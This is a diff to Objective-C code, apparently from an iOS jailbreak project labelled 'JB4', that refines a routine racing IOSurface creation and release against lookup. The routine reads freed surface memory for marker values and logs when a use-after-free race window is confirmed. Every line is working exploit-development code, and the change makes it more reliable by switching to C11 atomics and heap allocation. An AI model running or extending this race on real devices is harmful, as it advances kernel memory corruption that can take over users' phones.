@@ -22908,12 +22908,11 @@ void iosurface_notify_uaf_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull d
 
         if (!isr_stopped()) {
             log(@"JB4: --- Paso 3: Race Create/Release + Lookup ---");
-            __block volatile int32_t raceHits = 0;
-            __block volatile int32_t raceMiss = 0;
-            __block volatile int32_t raceUAF = 0;
-            __block volatile uint32_t sharedIDs[64];
-            __block volatile int32_t idIdx = 0;
-            memset((void*)sharedIDs, 0, sizeof(sharedIDs));
+            __block atomic_int raceHits = 0;
+            __block atomic_int raceMiss = 0;
+            __block atomic_int raceUAF = 0;
+            volatile uint32_t *sharedIDs = (volatile uint32_t *)calloc(64, sizeof(uint32_t));
+            __block atomic_int idIdx = 0;
 
             dispatch_group_t group = dispatch_group_create();
             dispatch_queue_t q1 = dispatch_queue_create("jb4.creator", DISPATCH_QUEUE_SERIAL);
@@ -22925,7 +22924,7 @@ void iosurface_notify_uaf_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull d
                         IOSurfaceRef s = createSurf((__bridge CFDictionaryRef)props);
                         if (s) {
                             uint32_t sid = getID ? getID(s) : 0;
-                            int32_t idx = OSAtomicIncrement32((volatile int32_t*)&idIdx) - 1;
+                            int idx = atomic_fetch_add(&idIdx, 1);
                             sharedIDs[idx % 64] = sid;
                             usleep(50);
                             CFRelease(s);
@@ -22937,35 +22936,36 @@ void iosurface_notify_uaf_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull d
             dispatch_group_async(group, q2, ^{
                 for (int i = 0; i < 2000 && !isr_stopped(); i++) {
                     @autoreleasepool {
-                        int32_t curIdx = idIdx;
+                        int curIdx = atomic_load(&idIdx);
                         if (curIdx <= 0) { usleep(10); continue; }
                         uint32_t sid = sharedIDs[(curIdx - 1) % 64];
                         if (sid == 0) continue;
 
                         IOSurfaceRef looked = lookup ? lookup(sid) : NULL;
                         if (looked) {
-                            OSAtomicIncrement32((volatile int32_t*)&raceHits);
+                            atomic_fetch_add(&raceHits, 1);
                             void *b = getBase ? getBase(looked) : NULL;
                             if (b) {
                                 uint32_t val = 0;
                                 memcpy(&val, b, sizeof(val));
                                 if (val == 0xDEADDEAD || val == 0xFEEDFACE) {
-                                    OSAtomicIncrement32((volatile int32_t*)&raceUAF);
+                                    atomic_fetch_add(&raceUAF, 1);
                                 }
                             }
                             CFRelease(looked);
                         } else {
-                            OSAtomicIncrement32((volatile int32_t*)&raceMiss);
+                            atomic_fetch_add(&raceMiss, 1);
                         }
                     }
                 }
             });
 
             dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
+            free((void*)sharedIDs);
             log([NSString stringWithFormat:@"JB4: Race result: hits=%d miss=%d uaf_patterns=%d",
-                 raceHits, raceMiss, raceUAF]);
-            if (raceMiss > 0) {
-                log([NSString stringWithFormat:@"JB4: *** %d LOOKUP FALLIDOS — superficie ya liberada ***", raceMiss]);
+                 atomic_load(&raceHits), atomic_load(&raceMiss), atomic_load(&raceUAF)]);
+            if (atomic_load(&raceMiss) > 0) {
+                log([NSString stringWithFormat:@"JB4: *** %d LOOKUP FALLIDOS — superficie ya liberada ***", atomic_load(&raceMiss)]);
                 log(@"JB4: Ventana de race confirmada entre Create/Release y Lookup");
             }
         }
